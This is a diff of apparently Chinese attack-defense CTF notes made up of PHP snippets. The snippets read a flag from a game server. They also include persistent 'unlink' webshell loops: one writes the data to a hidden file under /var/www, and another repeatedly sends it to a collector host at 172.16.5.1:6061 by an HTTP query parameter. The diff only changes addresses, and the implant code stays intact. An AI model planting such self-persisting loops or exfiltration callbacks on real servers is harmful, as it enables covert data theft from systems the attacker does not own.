@@ -9,9 +9,9 @@ file_put_contents文件：.f.php
 */
 
 1、直接输出flag
-<?php echo file_get_contents("http://10.0.0.2:8080");?>
+<?php echo file_get_contents("http://10.0.0.2");?>
 -----
-<?php $ch = curl_init();curl_setopt($ch,CURLOPT_URL,'http://10.0.0.2:8080');echo curl_exec($ch);?>
+<?php $ch = curl_init();curl_setopt($ch,CURLOPT_URL,'http://10.0.0.2');echo curl_exec($ch);?>
 
 2、unlink马
 (1)写flag到本地文件中
@@ -21,7 +21,7 @@ ignore_user_abort(true);
 set_time_limit(0);
 
 while (True){
-    $f=(file_get_contents('http://10.0.0.2:8080'));
+    $f=(file_get_contents('http://10.0.0.2'));
     file_put_contents("/var/www/8012/.o",$f);
     sleep(5);
 }
@@ -34,8 +34,8 @@ ignore_user_abort(true);
 set_time_limit(0);
 
 while (True){
-    $f=file_get_contents('http://localhost:80/flag.txt');
-    file_get_contents("http://172.16.80.1:8000?f=".$f);
+    $f=file_get_contents('http://10.0.0.2');
+    file_get_contents("http://172.16.5.1:6061?f=".$f);
     sleep(10);
 }
 ?>
